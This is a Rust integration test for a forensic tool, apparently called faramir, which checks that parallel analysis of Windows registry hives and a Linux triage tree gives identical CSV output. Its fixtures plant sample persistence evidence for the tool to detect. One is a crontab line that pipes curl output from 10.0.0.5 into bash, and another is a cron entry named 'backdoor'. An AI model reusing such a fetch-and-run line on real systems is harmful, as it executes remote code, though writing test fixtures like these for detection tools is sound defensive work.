//! `--jobs`: several targets analysed at the same time give the CSV the
//! sequential run gives, byte for byte, with the same diagnostics summary.
mod common;
use common::*;
use std::path::{Path, PathBuf};

const RUN: &str = r"Microsoft\Windows\CurrentVersion\Run";

fn run(args: &[&str]) -> (i32, String, String) {
    let o = std::process::Command::new(env!("CARGO_BIN_EXE_faramir")).args(args).output().expect("run faramir");
    (o.status.code().unwrap_or(-1), String::from_utf8_lossy(&o.stdout).to_string(), String::from_utf8_lossy(&o.stderr).to_string())
}

/// Three Windows hosts (a SOFTWARE hive each, different Run values) and one
/// Linux triage tree: four independent targets for the workers.
fn evidence(d: &TempDir) -> Vec<PathBuf> {
    let mut targets = Vec::new();
    for (host, exe) in [("WS01", r"C:\Users\Public\a.exe"), ("WS02", r"C:\Program Files\Vendor\tray.exe"), ("WS03", r"C:\Windows\Temp\x.exe")] {
        let dir = d.mkdir(host);
        let mut b = HiveBuilder::software();
        b.sz(RUN, "Updater", exe).sz(RUN, "Shared", r"C:\Program Files\Common Files\svc.exe");
        b.write(&dir.join("SOFTWARE"));
        targets.push(dir);
    }
    d.mkdir("uac-web01-linux-20261028000000/[root]");
    d.write("uac-web01-linux-20261028000000/[root]/etc/passwd", b"root:x:0:0:root:/root:/bin/bash\nbob:x:1000:1000::/home/bob:/bin/bash\n");
    d.write("uac-web01-linux-20261028000000/[root]/etc/hostname", b"web01\n");
    d.write(
        "uac-web01-linux-20261028000000/[root]/etc/crontab",
        b"SHELL=/bin/sh\n17 *\t* * *\troot\tcd / && run-parts --report /etc/cron.hourly\n",
    );
    d.write("uac-web01-linux-20261028000000/[root]/etc/cron.d/backdoor", b"* * * * * root /tmp/.x/run.sh\n");
    d.write("uac-web01-linux-20261028000000/[root]/var/spool/cron/crontabs/bob", b"* * * * * curl -s http://10.0.0.5/a.sh | bash\n");
    targets.push(d.join("uac-web01-linux-20261028000000"));
    targets
}

fn faramir_on(targets: &[PathBuf], out: &Path, extra: &[&str]) -> (i32, String, String) {
    let mut args: Vec<String> = Vec::new();
    for t in targets {
        args.push("-d".into());
        args.push(t.display().to_string());
    }
    args.push("-o".into());
    args.push(out.display().to_string());
    args.extend(extra.iter().map(|s| s.to_string()));
    let refs: Vec<&str> = args.iter().map(|s| s.as_str()).collect();
    run(&refs)
}

fn line_with(out: &str, needle: &str) -> String {
    out.lines().find(|l| l.contains(needle)).map(|l| l.to_string()).unwrap_or_else(|| panic!("no line with {needle:?} in {out}"))
}

#[test]
fn the_csv_is_the_same_byte_for_byte_with_one_or_several_workers() {
    let d = TempDir::new("jobs_same");
    let targets = evidence(&d);
    let one = d.join("one.csv");
    let (code, out1, _) = faramir_on(&targets, &one, &["--jobs", "1"]);
    assert_eq!(code, 0);
    let bytes_one = std::fs::read(&one).unwrap();
    assert!(bytes_one.len() > 200, "{}", String::from_utf8_lossy(&bytes_one));
    let rows = bytes_one.iter().filter(|b| **b == b'\n').count() - 1;
    assert!(rows >= 8, "three hosts with two Run values each and the cron rows: {rows} rows");

    for jobs in ["4", "2", "0", "16"] {
        let csv = d.join(&format!("jobs{jobs}.csv"));
        let (code, out, _) = faramir_on(&targets, &csv, &["--jobs", jobs]);
        assert_eq!(code, 0, "--jobs {jobs}");
        assert_eq!(std::fs::read(&csv).unwrap(), bytes_one, "--jobs {jobs}: the CSV changed");
        assert_eq!(line_with(&out, "Total persistence events"), line_with(&out1, "Total persistence events"), "--jobs {jobs}");
        assert_eq!(line_with(&out, "Diagnostics:"), line_with(&out1, "Diagnostics:"), "--jobs {jobs}: the diagnostics summary changed");
        assert_eq!(line_with(&out, "Hunt:"), line_with(&out1, "Hunt:"), "--jobs {jobs}");
    }
}

#[test]
fn the_default_is_several_workers_and_says_so_only_when_it_matters() {
    let d = TempDir::new("jobs_default");
    let targets = evidence(&d);
    let csv = d.join("default.csv");
    let (code, out, _) = faramir_on(&targets, &csv, &[]);
    assert_eq!(code, 0);
    let workers = faramir::jobs::default_jobs();
    if workers > 1 {
        let l = line_with(&out, "worker(s)");
        assert!(l.contains(&format!("{} target(s) on {} worker(s)", targets.len(), workers.min(targets.len()))), "{l}");
    } else {
        assert!(!out.contains("worker(s)"), "one core: no workers line\n{out}");
    }
    // one target: nothing to run side by side, no workers line
    let single = d.join("single.csv");
    let (code, out, _) = faramir_on(&targets[..1], &single, &["--jobs", "8"]);
    assert_eq!(code, 0);
    assert!(!out.contains("worker(s)"), "{out}");
    // --silent: nothing on stdout at all
    let quiet = d.join("quiet.csv");
    let (code, out, _) = faramir_on(&targets, &quiet, &["--jobs", "4", "--silent"]);
    assert_eq!(code, 0);
    assert!(out.trim().is_empty(), "{out}");
    assert_eq!(std::fs::read(&quiet).unwrap(), std::fs::read(&csv).unwrap(), "--silent changes nothing in the CSV");
}

#[test]
fn an_unreadable_target_is_a_diagnostic_whatever_the_worker_count() {
    // a directory that is neither Windows nor Linux evidence yields no rows
    // and no error; the diagnostics of the other targets are kept in order
    let d = TempDir::new("jobs_mixed");
    let mut targets = evidence(&d);
    let empty = d.mkdir("nothing-here");
    d.write("nothing-here/readme.txt", b"not evidence\n");
    targets.insert(1, empty);
    let a = d.join("a.csv");
    let b = d.join("b.csv");
    let (ca, oa, _) = faramir_on(&targets, &a, &["--jobs", "1"]);
    let (cb, ob, _) = faramir_on(&targets, &b, &["--jobs", "5"]);
    assert_eq!((ca, cb), (0, 0));
    assert_eq!(std::fs::read(&a).unwrap(), std::fs::read(&b).unwrap());
    assert_eq!(line_with(&oa, "Diagnostics:"), line_with(&ob, "Diagnostics:"));
}

#[test]
fn worker_panic_code_is_in_the_catalogue() {
    use faramir::errors::{FaramirError, Severity};
    let e = FaramirError::WorkerPanicked("WS02: index out of bounds".into());
    assert_eq!(e.code(), "ERR_CLI_WORKER_PANIC");
    assert_eq!(e.error_number(), 6004);
    assert_eq!(e.category(), "CLI");
    assert_eq!(e.severity(), Severity::Error);
    assert!(e.to_string().contains("missing from the CSV"));
    assert!(FaramirError::catalog().iter().any(|c| c.error_number() == 6004));
}
